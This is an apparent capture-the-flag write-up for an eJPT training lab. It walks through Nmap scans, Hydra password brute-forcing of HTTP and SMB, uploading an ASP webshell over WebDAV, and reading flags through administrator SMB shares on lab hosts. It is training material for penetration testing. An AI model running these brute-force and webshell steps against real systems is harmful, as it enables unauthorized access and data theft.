---
title: "eJPT - Host & Network Penetration Testing: System-Host Based Attacks CTF 1"
date: 2025-05-21 00:00:00 - 0500
categories: [ eJPT , Lab , Vulnerability Assessment]
tags: [Footprinting, Easy]
image:
    path: /assets/img/1.gif
    alt: image
---

---

### Overview

System/host-based attacks target the underlying operating system or individual hosts within a network to compromise their security. These attacks exploit vulnerabilities in the system's configuration, software, or hardware to gain unauthorized access, escalate privileges, or disrupt the normal functioning of the host. Common techniques include exploiting unpatched software vulnerabilities, misconfigurations, weak passwords, and malware infections. Attackers may attempt to gain root or administrator privileges to manipulate or steal sensitive data, install backdoors, or cause system crashes. System/host-based attacks can lead to significant breaches if not detected and mitigated promptly, making it essential for organizations to regularly update software, implement strong security policies, and monitor for suspicious activity to protect their systems from these threats.

This lab is designed to test your knowledge and skills in performing system/host-based attacks on Windows targets and identifying hidden information on a target machine.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.

**Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

**Useful files:**

```
/usr/share/metasploit-framework/data/wordlists/common_users.txt,
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt,
/usr/share/webshells/asp/webshell.asp
```

**Flags to Capture:**

- **Flag 1**: User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)
- **Flag 2**: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)
- **Flag 3**: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)
- **Flag 4**: The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)

# Tools

The best tools for this lab are:

- Nmap
- Hydra
- Cadaver
- Metasploit Framework

---

### Flag 1:

Let’s start with information gathering using Nmap and here is the command for it, 

```bash
┌──(root㉿INE)-[~]
└─# nmap -sC -sV target1.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-21 11:35 IST
Nmap scan report for target1.ine.local (10.5.26.63)
Host is up (0.0022s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=target1.ine.local
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-21T06:05:47+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=EC2AMAZ-JVD17HK
| Not valid before: 2024-12-31T07:25:48
|_Not valid after:  2025-07-02T07:25:48
| rdp-ntlm-info: 
|   Target_Name: EC2AMAZ-JVD17HK
|   NetBIOS_Domain_Name: EC2AMAZ-JVD17HK
|   NetBIOS_Computer_Name: EC2AMAZ-JVD17HK
|   DNS_Domain_Name: EC2AMAZ-JVD17HK
|   DNS_Computer_Name: EC2AMAZ-JVD17HK
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-21T06:05:40+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-05-21T06:05:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.35 seconds
```

With this information let’s start with website, hope we find something useful there. It seems like we need to login in order to access the website. From the Scope we already know the username which is `bob` but still we need to find the password for that username, here comes the play of tool called hydra, with that we can brute force our way in, Here is the command to run the brute force against the target using hydra.

![alt text](/assets/img/imagea.png)

```bash
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get /
```

```bash
┌──(root㉿INE)-[~]                                                                                                                                                                       
└─# hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get /                                                                       
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-21 15:02:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1010 login tries (l:1/p:1010), ~64 tries per task
[DATA] attacking http-get://target1.ine.local:80/
[80][http-get] host: target1.ine.local   login: bob   password: password_123321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-21 15:03:04
```

> Creds found! 
> 
> 
>bob:password_123321

</aside>

Now that we found the username and the password let’s try these creds to login and view the service. Its time to find the sub directory to find the more information. here comes the use of tool called `dirb` , hence the service is behind password authentication we need to provide creds to dirb in order to work smoothly.

![alt text](/assets/img/imageb.png)

```bash
┌──(root㉿INE)-[~]
└─# dirb http://target1.ine.local -u bob:password_123321                                                                                                                                 
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
START_TIME: Wed May 21 15:07:08 2025
URL_BASE: http://target1.ine.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
AUTHORIZATION: bob:password_123321
-----------------
GENERATED WORDS: 4612                                                          
---- Scanning URL: http://target1.ine.local/ ----
==> DIRECTORY: http://target1.ine.local/aspnet_client/                                                                                                                                  
==> DIRECTORY: http://target1.ine.local/webdav/                                                                                                                                         
                                                                                                                                                                                        
---- Entering directory: http://target1.ine.local/aspnet_client/ ----
==> DIRECTORY: http://target1.ine.local/aspnet_client/system_web/                                                                                                                       
                                                                                                                                                                                     
---- Entering directory: http://target1.ine.local/webdav/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)                                                                                                                                                                                   
---- Entering directory: http://target1.ine.local/aspnet_client/system_web/ ----                                                                                                                                                                                  
```

Here we found some good directories, let’s find what is behind the directory called `webdav` , We found the First flag.txt

![alt text](/assets/img/imagec.png)

---

### Flag 2:

Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)

Hence the service that is running is `webdav`, **WebDAV (Web Distributed Authoring and Versioning)** is an extension of the HTTP protocol that allows users to manage and edit files on remote web servers. In other words WebDAV lets you **upload, download, edit, delete, and organize files on a web server**, much like a shared drive. with that in mind we’ll use a tool called davtest which is the used to upload a list of executable files and check if the files can be executable on the webdav. 

```bash
┌──(root㉿INE)-[~]
└─# davtest -auth bob:password_123321 -url http://target1.ine.local/webdav                                                                                                                                                                 
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://target1.ine.local/webdav
********************************************************
NOTE    Random string for this session: 5AaeXS
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://target1.ine.local/webdav/DavTestDir_5AaeXS
********************************************************
 Sending test files
PUT     jsp     SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.jsp
PUT     aspx    SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.aspx
PUT     txt     SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.txt
PUT     asp     SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.asp
PUT     cfm     SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.cfm
PUT     cgi     SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.cgi
PUT     pl      SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.pl
PUT     html    SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.html
PUT     shtml   SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.shtml
PUT     jhtml   SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.jhtml
PUT     php     SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.php
********************************************************
 Checking for test file execution
EXEC    jsp     FAIL
EXEC    aspx    SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.aspx
EXEC    aspx    FAIL
EXEC    txt     SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.txt
EXEC    txt     FAIL
EXEC    asp     SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.asp
EXEC    asp     FAIL
EXEC    cfm     FAIL
EXEC    cgi     FAIL
EXEC    pl      FAIL
EXEC    html    SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.html
EXEC    html    FAIL
EXEC    shtml   SUCCEED:        http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.shtml
EXEC    shtml   FAIL
EXEC    jhtml   FAIL
EXEC    php     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://target1.ine.local/webdav/DavTestDir_5AaeXS
PUT File: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.jsp
PUT File: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.aspx
PUT File: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.txt
PUT File: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.asp
PUT File: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.cfm
PUT File: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.cgi
PUT File: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.pl
PUT File: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.html
PUT File: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.shtml
PUT File: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.jhtml
PUT File: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.php
Executes: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.aspx
Executes: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.txt
Executes: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.asp
Executes: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.html
Executes: http://target1.ine.local/webdav/DavTestDir_5AaeXS/davtest_5AaeXS.shtml
```

From the result of this service we identified that the file extension `asp`  can be upload and executed successfully by the davtest tool. Now that goes away we’ll use cadaver to upload our files into the target machines. 

 

```bash
┌──(root㉿INE)-[~]
└─# cadaver http://target1.ine.local/webdav                                                                                                                                              
Authentication required for target1.ine.local on server `target1.ine.local':
Username: bob
Password: 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_5AaeXS                      0  May 21 15:16
        flag1.txt                             34  May 21 14:44
        readme.txt                            18  Dec 31 13:20
        test.asp                              61  Dec 31 14:04
        web.config                           168  Dec 31 14:08
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
dav:/webdav/> 
```

![alt text](/assets/img/imaged.png)

Now that we found the flag2, let’s move on to next machine, to view this flag use this command on the run terminal. 

```bash
type C:\flag2.txt
```

---

### Flag 3:

By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)

This is again on the new machine so we have to start from the information gathering phase which is form the Nmap scan. here is the scan results

```bash
┌──(root㉿INE)-[~]
└─# nmap target2.ine.local -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-21 15:31 IST
Nmap scan report for target2.ine.local (10.5.27.231)
Host is up (0.0021s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-21T10:01:20+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: EC2AMAZ-3SC2DRK
|   NetBIOS_Domain_Name: EC2AMAZ-3SC2DRK
|   NetBIOS_Computer_Name: EC2AMAZ-3SC2DRK
|   DNS_Domain_Name: EC2AMAZ-3SC2DRK
|   DNS_Computer_Name: EC2AMAZ-3SC2DRK
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-21T10:01:11+00:00
| ssl-cert: Subject: commonName=EC2AMAZ-3SC2DRK
| Not valid before: 2024-12-31T08:26:27
|_Not valid after:  2025-07-02T08:26:27
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: EC2AMAZ-3SC2DRK
|   NetBIOS computer name: EC2AMAZ-3SC2DRK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-21T10:01:16+00:00
| smb2-time: 
|   date: 2025-05-21T10:01:13
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 2s, median: 0s                                                                                                                                        
| smb2-security-mode:                                                                                                                                                                    
|   3:1:1:                                                                                                                                                                               
|_    Message signing enabled but not required
```

Here found the service SMB, Since we didn’t found any username and the password for this we’ll find it using same old traditional methods which is brute forcing.  

```bash
┌──(root㉿INE)-[~]
└─# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://target2.ine.local                
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-21 15:50:33
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 7070 login tries (l:7/p:1010), ~7070 tries per task
[DATA] attacking smb://target2.ine.local:445/
[445][smb] host: target2.ine.local   login: rooty   password: spongebob
[445][smb] host: target2.ine.local   login: demo   password: password1
[445][smb] host: target2.ine.local   login: auditor   password: hellokitty
[445][smb] host: target2.ine.local   login: administrator   password: pineapple
1 of 1 target successfully completed, 4 valid passwords found
```


>
> Creds found!
>
> rooty:spongebob
> demo:password1
> auditor:hellokitty
> administrator:pineapple
>


With these creds we can login in into the SMB and first let’s uses the username `administrator:pineapple`  and that works we’re able to list the contents.

```bash
──(root㉿INE)-[~]
└─# smbclient -L //target2.ine.local -U administrator                                                                                                                                    
Password for [WORKGROUP\administrator]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Shared          Disk      
        Shared2         Disk      
        Shared3         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to target2.ine.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The administrator has 6 shares. Before accessing any of the shares, let’s check the permissions of each one. To do this, we’ll use the `crackmapexec` tool.

```bash
crackmapexec smb target2.ine.local -u administrator -p pineapple --shares
```

After running the command, we discover that only two shares have read and write permissions: `ADMIN$` and `C$` . Let’s connect to the SMB and We've found the third flag

```bash
┌──(root㉿INE)-[~]
└─# smbclient //target2.ine.local/C$ -U administrator                                                                                                                                    
Password for [WORKGROUP\administrator]:
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Sat Nov  7 13:45:59 2020
  Boot                              DHS        0  Wed Sep  9 10:08:52 2020
  bootmgr                          AHSR   408692  Wed Sep  9 10:03:42 2020
  BOOTNXT                           AHS        1  Sat Sep 15 12:42:30 2018
  Documents and Settings          DHSrn        0  Wed Nov 14 21:40:15 2018
  EFI                                 D        0  Wed Nov 14 12:26:18 2018
  flag3.txt                           A       34  Wed May 21 15:46:51 2025
  pagefile.sys                      AHS 2013265920  Wed May 21 15:45:36 2025
  PerfLogs                            D        0  Wed May 13 23:28:09 2020
  Program Files                      DR        0  Sat Nov  7 13:17:23 2020
  Program Files (x86)                 D        0  Sat Nov  7 13:17:24 2020
  ProgramData                       DHn        0  Wed Jan  1 13:47:15 2025
  Recovery                         DHSn        0  Wed Jan  1 13:54:07 2025
  Shared                              D        0  Tue Dec 31 16:59:14 2024
  System Volume Information         DHS        0  Sat Nov  7 12:06:43 2020
  Users                              DR        0  Wed Jan  1 14:00:24 2025
  Utilities                           D        0  Sat Nov  7 13:19:05 2020
  Windows                             D        0  Wed May 21 15:50:40 2025

                7863807 blocks of size 4096. 3621120 blocks available
smb: \> 

```

---

### Flag 4:

The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)

For this we just have to look into the desktop directory and we found the last flag!!!

```bash
smb: \Users\Administrator\> cd Desktop
smb: \Users\Administrator\Desktop\> dir
  .                                  DR        0  Wed May 21 15:46:51 2025
  ..                                 DR        0  Wed May 21 15:46:51 2025
  desktop.ini                       AHS      282  Wed Jan  1 14:00:35 2025
  flag4.txt                           A       34  Wed May 21 15:46:51 2025

                7863807 blocks of size 4096. 3644380 blocks available
smb: \Users\Administrator\Desktop\> get flag4.txt 
getting file \Users\Administrator\Desktop\flag4.txt of size 34 as flag4.txt (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
smb: \Users\Administrator\Desktop\> !cat flag4.txt
740f595e341f45bfb**************
```

---